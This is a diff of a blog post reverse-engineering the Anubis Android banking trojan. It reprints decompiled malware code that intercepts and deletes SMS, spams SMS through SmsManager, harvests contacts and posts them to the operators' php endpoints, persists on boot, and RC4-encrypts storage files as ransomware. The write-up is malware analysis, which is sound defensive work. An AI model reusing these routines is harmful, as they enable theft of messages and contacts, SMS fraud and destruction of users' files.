@@ -31,9 +31,9 @@ In this blog post, i will poke various parts of the malware while reverse engine
     - mobsf
     - jadx-gui
 
-# Analysis 
+## Analysis 
 
-## The manifest 
+### The manifest 
 
 to analyze the manifest
 ![extracting with apktool](/img/anubis/anubis_apktool.png) 
@@ -78,13 +78,35 @@ by investigating the activities in the xml, we can get a rough idea about which 
 Its the MainActivity, which will be our first target when approaching the malware.
 
 ```xml
-        <receiver android:name="wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.cmtstflxlxb" android:permission="android.permission.BROADCAST_SMS">
+        <activity android:name="wocwvy.czyxoxmbauu.slsa.opzsdswiddt">
             <intent-filter>
-                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+                <action android:name="android.intent.action.SEND"/>
+                <action android:name="android.intent.action.SENDTO"/>
+                <data android:scheme="sms"/>
+                <data android:scheme="smsto"/>
+                <data android:scheme="mms"/>
+                <data android:scheme="mmsto"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
             </intent-filter>
-        </receiver>
+        </activity>
 ```
-class `wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.cmtstflxlxb` is responsible for delivering messages.
+Activity `wocwvy.czyxoxmbauu.slsa.opzsdswiddt` has capabilities to send sms.
+
+```xml
+        <service android:name="wocwvy.p003x881dce2d.slsa.lmimy" android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:scheme="sms"/>
+                <data android:scheme="smsto"/>
+                <data android:scheme="mms"/>
+                <data android:scheme="mmsto"/>
+            </intent-filter>
+        </service>
+```
+
+class `wocwvy.czyxoxmbauu.slsa.lmily` is service that it responsible for responding messages.
 
 ```xml
         <receiver android:name="wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.hypihteeavv">
@@ -314,7 +336,7 @@ if (Java.available) {
 the result was empty, which implies that the malware is not loading classes at runtime.
 From which i assume that this malware is not packed.
 
-## Diving deep
+### Diving deep
 
 Since we have idenitified the MainActivity and some other useful classes using the manifest, we know where to start. We'll start with the MainActivity (obiviously) and move into other stuff we idenitified.
 
@@ -640,6 +662,8 @@ see? we've found the shared preference xml. Now its all about extracting it from
 </map>
 ```
 
+This xml file explains what this malware is capable of. 
+
 here's another agent to monitor what values are being written to the xml file.
 ```javascript
 'use strict';
@@ -680,6 +704,8 @@ Interceptor.attach(Module.findExportByName(null, "open"), {
 
 However it does not explicitly specify what are the new values written to the file. Instead, it prints the whole buffer. In this case, the buffer is
 the xml.
+
+
 
 ### C2s, Tweets and Data Exfiltration
 
@@ -957,7 +983,6 @@ public class C0063a {
         }
         return iArr;
     }
-
 ```
 
 So what this does is, creates an int array of size 256, fill it with numbers from 0 - 255, loop through 0 - 255 and
@@ -1068,17 +1093,28 @@ there's a bunch of if statements, each checks whether the first string argument 
 inside the try block we see a call to a famililar method, getSharedPreference. In this case key is `"url"`. 
 well if search the xml, you wont find any.
 
+here is what method `mo363a` does,
+
+```java
+    /* renamed from: a */
+    public String mo363a(String str, String str2) {
+        SomeHttpClass bVar = new SomeHttpClass();
+        AsyncTaskC0079a aVar = new AsyncTaskC0079a();
+        aVar.execute(str, str2);
+        try {
+            return bVar.GetMiddleString((String) aVar.get(), "<tag>", "</tag>");
+        } catch (Exception unused) {
+            return "";
+        }
+    }
+```
+
+So i guess this is what we saw earlier when we hooked the function that parses response html from the twitter request with frida.
+Basically this method starts a HttpConnection and send the required information to the target **php endpoint**. Therefore we can rename the method to `exfiltrate`.
+
 Now the problem is, how is this thing retrieving value of a shared preference with a non-existing key?
 
-Probably because malware is generating and writing the url dynamically to the xml.
-
-
-
-
-
-
-
-Let's analyze the method that makes use of above **php endpoints**.
+Probably because malware is generating and writing the url dynamically to the xml. Let's analyze the method that makes use of above **php endpoints**.
 
 ```java
 public void mo211a(Context context, String str, String str2, String str3) { 
@@ -1449,16 +1485,528 @@ if it does, it replaces the name with an empty string and append the name to the
 
 here is the list of applications that anubis targets.
 
-### SMS Sending, Recieving and Spamming
+Until now, we have analyzed core features of the anubus banking trojan. Now it is time to take a look at some other features mentioned in the shared preference xml and manifest xml.
 
+### Achieving Persistance and User Presence
 
-Some methods in `SomeHttpClass` is responsible for reading, intercepting and spamming SMS messages.
+When we were analyzing the manifest xml file, we came across a broadcast receiver that listens for BOOT_COMPLETE. Let's take a look at that class.
 
 ```java
-    public void ReadSMS(Context context, String str, String str2) {
-        StringBuilder sb = new StringBuilder();
-        sb.append("p=");
-        sb.append(mo225c(mo247q(context) + "|Incoming SMS" + '\n' + "Number: " + str + '\n' + "Text: " + str2 + '\n' + "|"));
-        mo218b(context, "4", sb.toString());
+
+/* renamed to EventListener */
+public class EventListener extends BroadcastReceiver {
+
+    /* renamed from: a */
+    SomeHttpClass cls = new SomeHttpClass();
+
+    [... more code]
+}
+```
+
+it has only one member variable, that of `SomeHttpClass`.
+
+```java
+    public void mo443a(Context context, Intent intent) {
+        String action = intent.getAction();
+        context.startService(new Intent(context, Service1.class));
+        SomeHttpClass cls1 = this.cls;
+        cls1.mo213a("Action", "BOOT Start " + action);
+
+        [... more code]
     }
 ```
+
+First method of this class accepts two arguments, one being of class `Context` and the other being of class `Intent`.
+In the next few lines, it retrieves the action that called this method using `intent.getAction()`, stores it in `String action` and starts a new service `Service1`, which we reversed ealier.
+
+```java
+        try {
+            SomeHttpClass bVar2 = this.cls;
+            SomeHttpClass.StartAlarm(context, "startAlarm", (long) Integer.parseInt(this.cls.GetSharedPreference(context, "Interval")));
+        } catch (Exception unused) {
+            SomeHttpClass bVar3 = this.cls;
+            SomeHttpClass.StartAlarm(context, "startAlarm", 15000);
+        }
+```
+
+inside the try block, just like in the MainActivity, it tries to start an alarm. if it fails, it uses a default value of `15000` to start the alarm.
+Since we have already identified that the return value of `GetSharedPreferences(context, "Interval")` is 10000, this time we can think of some difference in the alarm time, compared to our previous encounter with the `Interval` key.
+
+```java
+        if (action.equals("android.intent.action.USER_PRESENT")) {
+            context.startService(new Intent(context, IntentServiceC0110x9cb6f428.class));
+        }
+
+        if (action.equals("android.provider.Telephony.SMS_RECEIVED") && this.cls.GetSharedPreference(context, "perehvat_sws").contains("true")) {
+            mo444b(context, intent);
+        }
+    }
+```
+
+next few lines check whether if the action string is equal to `"android.intent.action.USER_PRESENT"`, if so, it starts another service.
+
+### SMS Sending, Recieving and Spamming
+
+`EventListener.mo443a` also checks whether the action is equal to `"android.intent.action.SMS_RECEIVED"` and value for shared preference key `perehvat_sws` 
+is equal to to true. if so, it calls another method. Since it is clear that `mo443a` method is essentially listening for incoming messages, this could be the one that process and convert it into a content.
+
+```java
+public void mo444b(Context context, Intent intent) {
+        Bundle extras = intent.getExtras();
+```
+
+it takes two parameters, a `Context` and `Intent`. then it initializes a variable of class `Bundle` with `intent.getExtras()`. We saw 
+earlier that `mo443a` calls this method by passing the same values that it receives as arguments. as everyones knows an intent is a way to switch between activities, `getExtras` is a way to retrieve values stored in a `Bundle`. so this is basically a way to pass stuff betweeen intents.
+
+```java
+        if (extras != null) {
+            try {
+                Object[] objArr = (Object[]) extras.get("pdus");
+                String str = "";
+                String str2 = "";
+```
+
+in the next few lines, it checks whether the variable of type `Bundle` is not equals to null. A Bundle is a if the evaluation turns out to be true, it does some work inside the try block. 
+
+inside the block, it creates and initializes an `Object` array named `objArr`, and call `extras.get("pdus")` on it to retrieve values for key `pdus`. (A PDU (payload data unit) which contains information regarding a SMS)
+
+it also declares two string empty strings.
+
+```java
+                if (objArr != null) {
+                    int length = objArr.length;
+                    int i = 0;
+```
+
+then it checks whether if Object array it created earlier is not null, if true, it initializes a variable of int named `length` with
+`objArr.length`.
+
+
+```java
+                    while (i < length) {
+                        SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) objArr[i]);
+                        String displayOriginatingAddress = createFromPdu.getDisplayOriginatingAddress();
+                        String displayMessageBody = createFromPdu.getDisplayMessageBody();
+                        str2 = str2 + displayMessageBody;
+                        context.startService(new Intent(context, whemsbk.class).putExtra("num", displayOriginatingAddress).putExtra("ms", displayMessageBody));
+                        i++;
+                        str = displayOriginatingAddress;
+                    }
+```
+
+then it loops through the object array, and for each object in the array, it creates an object named `createFromPdu` that of class `SmsMessage` by calling `SmsMessage.createFromPdu`, 
+variables `displayOriginatingAddress`, `displayMessageBody` is assigned to `createFromPdu.getDisplayOriginatingAddress()` and `createFromPdu.getDisplayMessageBody()` respectively. And, `displayMessageBody` is appended to `str2`. in the next line, it starts another
+service.
+
+So in summery what this method does is, it retrieves every SMS that has been recieved using the `intent` passed to it by the method that calls it, interate through each and every one of them, parse the SMS to a SmsMessag object using `createFromPdu` method, and start a service passing the originating address and SMS content through the intent after parsing those information. 
+
+Let's take a look at the new service.
+
+```java
+public class whemsbk extends Service {
+
+    [... more code]
+
+    private void m487c(Context context, String str, String str2) {
+
+            [... more code]
+
+            Uri parse = Uri.parse("content://sms/inbox");
+            Cursor query = context.getContentResolver().query(parse, new String[]{"_id", "thread_id", "address", "person", "date", "body"}, null, null, null);
+            if (query != null && query.moveToFirst()) {
+                do {
+                    long j = query.getLong(0);
+                    query.getLong(1);
+                    String string = query.getString(2);
+                    if (!str.equals(query.getString(5)) && string.equals(str2)) {
+                        ContentResolver contentResolver = context.getContentResolver();
+                        contentResolver.delete(Uri.parse("content://sms/" + j), null, null);
+                    }
+                } while (query.moveToNext());
+            }
+```
+
+Basically, above method retrieves **id**, **thread_id**, **address**, **person**, **date**, and **body**. from `content://sms/inbox` using a ContentResolver. So with that, we can conclude that this method is parsing the contents of the SMS.
+
+Using the android manifest file, we have identified few classes that are responsible for messing with sending SMS.
+
+let's start with `wocwvy.czyxoxmbauu.slsa.lmily`.  
+
+```java
+package wocwvy.czyxoxmbauu.slsa;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+
+public class lmimy extends Service {
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+}
+```
+
+this looks sus. There's nothing important here. Maybe the malware author is trying to distract us with false information.
+
+But if we search for string `SMS`, we can find an IntentService (an IntentService is a service that handles asynchronous requests) that I think is in chaarge for SMS spamming.
+
+```java
+/* renamed from wifu */
+public class SMSSpam extends IntentService {
+
+    /* renamed from: a */
+    SomeHttpClass cls = new SomeHttpClass();
+
+    /* renamed from: b */
+    String str = "";
+
+    /* renamed from: c */
+    String name = "wifu";
+
+    public SMSSpam() {
+        super("wifu");
+    }
+
+    public void onHandleIntent(Intent intent) {
+        while (true) {
+            try {
+                TimeUnit.MILLISECONDS.sleep(10000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+```
+
+Since this is an IntentService, onHandleIntent is the first method that will get executed. quoting android api reference
+
+**"This method is invoked on the worker thread with a request to process. Only one Intent is processed at a time, but the processing happens on a worker thread that runs independently from other application logic"**
+
+it looks like the method tries to sleep for 10000 miliseconds inside an infinite loop. if it fails, it prints the stack trace.
+
+```java
+            if (this.cls.GetSharedPreference(this, "spamSMS").equals("start")) {
+                if (!this.cls.IsRunning(this, dshd.class)) {
+                    if (this.str.length() > 3) {
+                        this.str = "sendsms" + this.str;
+                    }
+```
+
+then it checks the value for shared preference key `spamSMS` is equal to `start`. 
+
+and if the check turns out to be true, if shared preference `spamSMS` results in `start`, it checks whether if a service named `dshd` is running, if not and if length of `str` is geater than 3, it appends `"sendsms"` to `str`.
+
+```java
+                    if (this.cls.GetSharedPreference(this, "indexSMSSPAM").contains("|||||")) {
+                        this.cls.SetSharedPreference(this, "spamSMS", "");
+                        SomeHttpClass bVar = this.cls;
+                        StringBuilder sb = new StringBuilder();
+                        sb.append("p=");
+                        sb.append(this.cls.Encode(this.cls.GetSSAID(this) + "|Ended balance, SMS spam stopped!|"));
+                        bVar.exfiltrate(this, "4", sb.toString());
+                    }
+```
+
+in the next line it checks if `GetSharedPreference("indexSMSSPAM")` returns a stirng with `|||||`, if true, it sets shared preference value `spamSMS` to an empty string using `SetSharedPreference`.
+
+then it creates a string builder and appends it with strings `"p="`, base64 encoded SSAID of the device and `"|Ended balance, SMS spam stopped!|"`. Then it sends the string to `/o1o/a6.php`.
+
+from that we can conclude if `GetSharedPreference("indexSMSSPAM")` results in `|||||`, it means the balance of SIM card has ended.
+
+```java
+                    SomeHttpClass bVar2 = this.cls;
+                    StringBuilder sb2 = new StringBuilder();
+                    sb2.append("p=");
+                    sb2.append(this.cls.Encode("getnumber" + this.str));
+                    String d = this.cls.EncodeAndEncrypt(bVar2.exfiltrate(this, "15", sb2.toString()));
+                    String str = "";
+                    String e2 = this.cls.GetSharedPreference(this, "textSPAM");
+```
+
+according to the above snippet, a string builder is created and appended with `"p="`, then it is again appended with base64 encoded 
+string of "`getnumber`" and `str`.
+
+then it is passed to `"/o1o/a15.php"`
+
+```java
+                    if (d.contains("/")) {
+                        str = d.split("/")[0];
+                        d = d.split("/")[1];
+                        e2 = e2.replace("{nameholder}", str);
+                    }
+                    if (d.equals("close")) {
+                        this.cls.SetSharedPreference(this, "spamSMS", "");
+                        break;
+                    }
+```
+
+next few lines looks crazy. first it checks whether return string of `exfiltrate`, `("/")`, if so it does some splitting and replace some strings.
+
+in the next if statement, if checks `d` is equal to string `"close"`, if so, it sets shared preference `spamSMS` to an empty stirng.
+
+```java
+                    this.cls.mo213a(this.name, "number: " + d + "  msg: " + e2);
+                    startService(new Intent(this, dshd.class).putExtra("number", d).putExtra("msg", e2));
+                    if (str.length() > 2) {
+                        d = str + "/" + d;
+                    }
+                    this.str = d;
+```
+
+at the end of the method, it calls a method from `SomeHttpClass`, then starts the service `dshd` and passes two key value pairs `("num", d)` and `("msg", e2)` through the intent.
+
+Since this is the end of the method, I suspect service `dshd` might contain the code that waits for the SMSs and start the spam.
+
+```java
+public class dshd extends Service {
+
+    /* renamed from: a */
+    Context ctx;
+
+    /* renamed from: b */
+    SomeHttpClass cls = new SomeHttpClass();
+
+    /* renamed from: c */
+    BroadcastReceiver reciever = new BroadcastReceiver() {
+        /* class wocwvy.p003x881dce2d.slsa.oyqwzkyy.p007x2753d1cd.dshd.C00951 */
+
+        /* renamed from: onReceive */
+        public void onReceive(Context context, Intent intent) {
+            SomeHttpClass bVar;
+            String str;
+            String str2;
+            if (getResultCode() != -1) {
+                dshd.this.cls.mo213a("S", "Error SMS SENT");
+                bVar = dshd.this.cls;
+                str = "indexSMSSPAM";
+                str2 = dshd.this.cls.GetSharedPreference(context, "indexSMSSPAM") + "|";
+            } else {
+                dshd.this.cls.mo213a("S", "SMS SENT");
+                bVar = dshd.this.cls;
+                str = "indexSMSSPAM";
+                str2 = "";
+            }
+            bVar.SetSharedPreference(context, str, str2);
+            dshd.this.unregisterReceiver(dshd.this.reciever);
+            dshd.this.stopSelf();
+        }
+    };
+```
+
+as we have already guessed, it is. `onReceive` method is responsible for checking whether SMS has sent successfully or not.
+
+```java
+    /* renamed from: onStartCommand */
+    public int onStartCommand(Intent intent, int i, int i2) {
+        this.ctx = this;
+        this.cls.SpamSMS(this, intent.getStringExtra("number"), intent.getStringExtra("msg"));
+        registerReceiver(this.reciever, new IntentFilter("SMS_SENT"));
+        return 2;
+    }
+```
+
+SMS spam code is implemented in `onStartCommand` method. it is the method that executes once the service is started. So we can assume that as soon as the service starts, it starts sending spam SMS to the number it receives through the intent. It also retrieves contents for the SMS through the intent (we saw earlier `onHandleIntent` add those stuff to extras before starting the service).
+
+However to send the SMS messages, it uses another method implemented in `SomeHttpClass`.
+
+Let's take a look at that one.
+
+```java
+   public void SpamSMS(Context context, String str, String str2) {
+        SmsManager smsManager = SmsManager.getDefault();
+        ArrayList<String> divideMessage = smsManager.divideMessage(str2);
+        PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent("SMS_SENT"), 0);
+        PendingIntent broadcast2 = PendingIntent.getBroadcast(context, 0, new Intent("SMS_DELIVERED"), 0);
+        ArrayList<PendingIntent> arrayList = new ArrayList<>();
+        ArrayList<PendingIntent> arrayList2 = new ArrayList<>();
+        for (int i = 0; i < divideMessage.size(); i++) {
+            arrayList2.add(broadcast2);
+            arrayList.add(broadcast);
+        }
+        smsManager.sendMultipartTextMessage(str, null, divideMessage, arrayList, arrayList2);
+    }
+```
+
+There's no need of explainations for this one. It is pretty clear that this one is the method that really sends the SMS messages. Now I'm thinking of changing the name of `SomeHttpClass` to something more like `UtilClass` or `CrazyShitHappensHere`.
+
+after sending the messages, `onStartCommand` registers a Broadcast receiver, which is in fact, `receiver`.
+
+### Reading Contacts
+
+```java
+/* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.wami */
+public class Contacts extends Activity {
+
+    public void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        try {
+
+            [... more code]
+
+            if (stringExtra.contains("0")) {
+                GetContacts(getContentResolver());
+            }
+
+            [... more code]
+
+        } catch (Exception unused) {
+            finish();
+        }
+    }
+
+```
+
+onCreate method initializes some local variables and calls another method that retrieves contact numbers.
+
+```java
+    public void GetContacts(ContentResolver contentResolver) {
+        try {
+            if (!this.cls.GetSharedPreference(this, "getNumber").equals("true")) {
+                Cursor query = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+                String str = "(" + this.cls.GetNetworkCountry(this) + ") Numbers from the phone book";
+                while (query.moveToNext()) {
+                    String string = query.getString(query.getColumnIndex("data1"));
+                    String string2 = query.getString(query.getColumnIndex("display_name"));
+                    if (!string.contains("*") && !string.contains("#") && string.length() > 6 && !str.contains(string)) {
+                        str = str + string + "     " + string2 + "</br>" + '\n';
+                    }
+                }
+                SomeHttpClass bVar = this.cls;
+                StringBuilder sb = new StringBuilder();
+                sb.append("p=");
+                sb.append(this.cls.Encode(this.cls.GetSSAID(this) + "|" + str + "|"));
+                bVar.exfiltrate(this, "4", sb.toString());
+                this.cls.SetSharedPreference(this, "getNumber", "true");
+                finish();
+            }
+        } catch (Exception unused) {
+            finish();
+        }
+    }
+```
+
+Inside the try block, `GetContacts` method checks if shared preference `getNumber` is equal to `true`. if so, method uses a ContentResolver to retrieve contact number. then it checks if `string` contatins **"*"** or **"#"**. it also checks if `str`, which is essentially the country code is in the retrieved number. if not, it appends `str` with the number. 
+
+Then it sends it to an endpoint `/o1o/a6.php`. Note the line break (</br>) appended to the end of the string. it seems like malware sends data back and forth using html format.
+
+It also sets shared preference value for `getNumber to true`.
+
+This service also implements a method that sends an SMS to every contact number with SMS body being the SSAID of the device.
+
+### Ransomware capabilities
+
+We saw it in the manifest that anubis has ransomware capabilities.
+
+```java
+public class wahiuolww extends IntentService {
+
+    /* renamed from: a */
+    SomeHttpClass cls = new SomeHttpClass();
+
+    /* renamed from: b */
+    String str = "";
+
+    /* renamed from: c */
+    String str1 = "";
+
+    public wahiuolww() {
+        super("wahiuolww");
+    }
+
+    public void onHandleIntent(Intent intent) {
+        SomeHttpClass bVar;
+        String str;
+        String str2;
+        this.str = this.cls.GetSharedPreference(this, "status");
+        this.str1 = this.cls.GetSharedPreference(this, "key");
+        File file = new File("/mnt");
+        File file2 = new File("/mount");
+        File file3 = new File("/sdcard");
+        File file4 = new File("/storage");
+        this.cls.mo213a("Cryptolocker", "1");
+        mo458a(Environment.getExternalStorageDirectory());
+        this.cls.mo213a("Cryptolocker", "2");
+        mo458a(file);
+        this.cls.mo213a("Cryptolocker", "3");
+        mo458a(file2);
+        this.cls.mo213a("Cryptolocker", "4");
+        mo458a(file3);
+        this.cls.mo213a("Cryptolocker", "5");
+
+        [... more code]
+    }
+}
+```
+
+`onHandleIntent` method initializes strings `str` and `str1` with the values of shared preference `"status"` and `"key"`. The key might be the encryption key. Then it initializes 4 objects of class `File`, for `"/mnt"`, `"/mount"`, `"/sdcard"` and `"/storage"`.
+
+Then it calls another method called `mo458a` implemented in the same class on each `File` plus `ExternalStorageDirectory()`.
+
+```java
+   public void mo458a(File file) {
+        FileOutputStream fileOutputStream;
+        try {
+            File[] listFiles = file.listFiles();
+            for (File file2 : listFiles) {
+                if (file2.isDirectory()) {
+                    mo459b(file2);
+                } 
+
+                [... more code]
+```
+
+The method accepts a `File` as the first and only parameter. It declares a `FileOutputStream` variable, then inside the try block, 
+it creates an array of type `File` named `listFiles` and initialize the array using `listFiles()` on the first parameter.
+
+then it iterates through each and every file. if file is directory, it calls itself. it looks like it the method is recursively traversing nodes of the file system.
+
+```java
+                else if (file2.isFile()) {
+                    try {
+                        SomeHttpClass bVar = this.cls;
+                        byte[] a = SomeHttpClass.ReadFile(file2);
+                        if (this.str.equals("crypt")) {
+                            if (!file2.getPath().contains(".AnubisCrypt")) {
+                                byte[] a2 = this.cls.rc4encrypt(a, this.str1);
+                                fileOutputStream = new FileOutputStream(file2.getPath() + ".AnubisCrypt", true);
+                                fileOutputStream.write(a2);
+                            }
+
+                [... more code]
+```
+
+else, if it is a file, it calls `SomeHttpClass.ReadFile` on it and stores the data in a byte array. then it checks if `str`, which is
+the global variable that holds the value of shared preference `status` is equal `"crypt"`. if yes, another nested if statement checks 
+whether current file's extension is equal to `.AnubisCrypt`. if yes, it calls `SomeHttpClass.rc4encrypt` by passing byte array `a` and 
+`str1`, which is the key, as arguments. returning byte array is assigned to a new byte array called `a2`.
+
+Then a new file is created with the same name but `.AnubisCrypt` appended to the end of it. byte array `a2` is then written to the newly
+created file.
+
+```java
+                        } else if (this.str.equals("decrypt") && file2.getPath().contains(".AnubisCrypt")) {
+                            byte[] b = this.cls.rc4decrypt(a, this.str1);
+                            fileOutputStream = new FileOutputStream(file2.getPath().replace(".AnubisCrypt", ""), true);
+                            fileOutputStream.write(b);
+                        }
+```
+
+if `str` (status) is equal to `"decrypt"` and if current file's path contains `.AnubisCrypt` as it's extension, a byte array `b` is 
+created and assigned to the return value of `SomeHttpClass.rc4decrypt`. then a new file is created without the extensionm which will then 
+be fiiled with byte array `b`.
+
+```java
+                        fileOutputStream.close();
+                        file2.delete();
+                    } catch (Exception unused) {
+                    }
+```
+
+then the output stream is closed and file is deleted from the disk.
+
+We can conclude that this method is the on in charge for encrypting and decrypting the file system based on the shared preferene value `status`.
+
+
+### the end
+
+Wow this. this is the longest article I have erver wrteen. So eayh
+
+#Speard anarchy
